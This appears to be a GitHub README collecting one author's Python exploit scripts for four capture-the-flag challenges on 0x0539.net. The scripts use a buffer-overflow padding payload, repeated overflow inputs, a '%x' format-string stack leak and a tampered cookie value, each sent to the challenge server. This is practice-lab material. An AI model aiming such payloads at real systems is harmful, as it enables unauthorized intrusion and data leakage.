<h1 align="center">
	<img src="https://lh3.googleusercontent.com/proxy/CpoUd8Vc7hVO5iuIL7QkWnlU5yt5dADWL_4vnIxil9CLnk9JokqiAJpoQcqe5jJW6doC-BgT-yi8" width="300px"><br>
    0x0539 - Here I will post my solutions/exploits for some of the challenges on 0x0539.net
</h1>
<p align="center">
	This repository will contain my exploits for solving some challenges on 0x0539.net. Please don't steal my code, and claim it as your own.
</p>

<p align="center">
	<a href="https://deno.land" target="_blank">
    	<img src="https://img.shields.io/badge/Version-1.0.0-7DCDE3?style=for-the-badge" alt="Version">
</p>

## SIGSEGV
```py
from pwn import *


# SIGSEGV
# Date: 08/21/21
# Made by 0x1CA3


class Pwn():
	def __init__(self, host, port):
		self.host = host
		self.port = port

	def exploit(self):
		payload = b'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA'
		connection = remote(self.host, self.port)
		connection.sendline(payload)
		connection.interactive()

def main():
	host = "challenges.0x0539.net"
	port = 7071
	Pwn(host, port).exploit()

if __name__ == "__main__":
	main()
```

## Inizializzato Pizzaria
```py
from pwn import *


# Inizializzato Pizzaria
# Date: 08/22/21
# Author: 0x1CA3


class Pwn():
    def __init__(self, host, port):
        self.host = host
        self.port = port

    def exploit(self):
        payload = b'444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444'
        connection = remote(self.host, self.port)
        connection.sendline(b'3')
        
        connection.sendline(payload)
        connection.sendline(payload)
        connection.sendline(payload)
        connection.sendline(payload)
        
        connection.sendline(b'4')
        connection.interactive()

def main():
    host = "challenges.0x0539.net"
    port = 3001
    Pwn(host, port).exploit()

if __name__ == "__main__":
    main()
```

## Bleed The Stack
```py
from pwn import *


# BleedTheStack
# Date: 08/27/21
# Author: 0x1CA3
# Note: The random numbers that are displayed once you run the exploit is the flag, you need to figure this part out yourself.


class Pwn():
    def __init__(self, host, port):
        self.host = host
        self.port = port

    def exploit(self):
        payload = b'%x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x'
        connection = remote(self.host, self.port)
        connection.sendline(payload)
        connection.interactive()

def main():
    host = "challenges.0x0539.net"
    port = 7070
    Pwn(host, port).exploit()

if __name__ == "__main__":
    main()
```
## Lucky Feeling
```py
import requests


# Lucky Feeling
# Date: 08/22/21
# Author: 0x1CA3


class Pwn():
    def __init__(self, host):
        self.host = host
    
    def exploit(self):
        s = requests.Session()
        site_cookies = {"rounds": "999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999"}
        
        a = s.get(self.host, cookies=site_cookies)
        
        for i in range(99):
            a = s.post(self.host, cookies=site_cookies, data={"guess": ""})
        print(s.post(self.host, cookies=site_cookies, data={"guess": ""}).text)

def main():
    host = "http://challenges.0x0539.net:3002/"
    Pwn(host).exploit()

if __name__ == "__main__":
    main()
```
## Credits
```
https://github.com/0x1CA3
```
### Contributions 🎉
###### All contributions are accepted, simply open an Issue / Pull request.
